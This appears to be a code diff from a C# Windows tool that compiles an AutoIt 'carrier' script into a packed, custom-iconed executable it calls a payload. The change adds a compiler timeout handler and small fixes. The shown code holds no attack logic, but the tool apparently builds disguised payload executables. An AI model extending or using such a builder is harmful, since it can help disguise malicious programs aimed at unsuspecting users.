@@ -56,7 +56,18 @@ namespace masamangalternatibo {
                     ProcessStartInfo _compilepsi = new ProcessStartInfo("compiler.exe", @"/in ""$carrier.au3"" /out ""$carrier.exe"" /comp 4 " + (rb32bit.Checked ? "/x86 " : "/x64 ") + (upx ? @"/pack " : "/nopack ") + (isicon ? @"/icon ""$tmp.ico""" : ""));
                     _compilepsi.WindowStyle = ProcessWindowStyle.Hidden;
                     Process _cpsihndl = Process.Start(_compilepsi);
-                    _cpsihndl.WaitForExit();
+
+                    //Time-out handler
+                    while (_cpsihndl.WaitForExit(10000) == false) {
+                        if (MessageBox.Show("The compiler may not be responding!\n\nWould you like to terminate the process or wait for it to respond?\n\nYes - Terminate the Compiler\nNo - Set another 10s Timeout", "Compiler Timed-out!", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes) {
+                            while (_cpsihndl.HasExited == false) {
+                                _cpsihndl.Kill();
+                            }
+                            MessageBox.Show("Compiler has been terminated!", "Compiler Terminated");
+                            return;
+                        }
+                    }
+
                     if (File.Exists("$carrier.exe")) {
                         File.Move("$carrier.exe", flnmexport);
                         if (MessageBox.Show("Payload Created!\n\nExport: " + flnmexport + "\n\nOpen payload directory?", "Build Finished", MessageBoxButtons.YesNo) == DialogResult.Yes) {
@@ -70,12 +81,12 @@ namespace masamangalternatibo {
                 }
             }
             else {
-                MessageBox.Show("Filename already in use!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
+                MessageBox.Show("Filename already in use!\n\nConflict: " + flnmexport, "Error!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
             }
         }
 
         private void buildPayload_Load(object sender, EventArgs e) {
-            if (script != "") { btnPreview_LinkClicked(null, null); } //Prevents crash when form is loaded through "showallui"
+            if (script != null) { btnPreview_LinkClicked(null, null); } //Prevents crash when form is loaded through "showallui"
         }
 
         private void buildPayload_MouseMove(object sender, EventArgs e) {
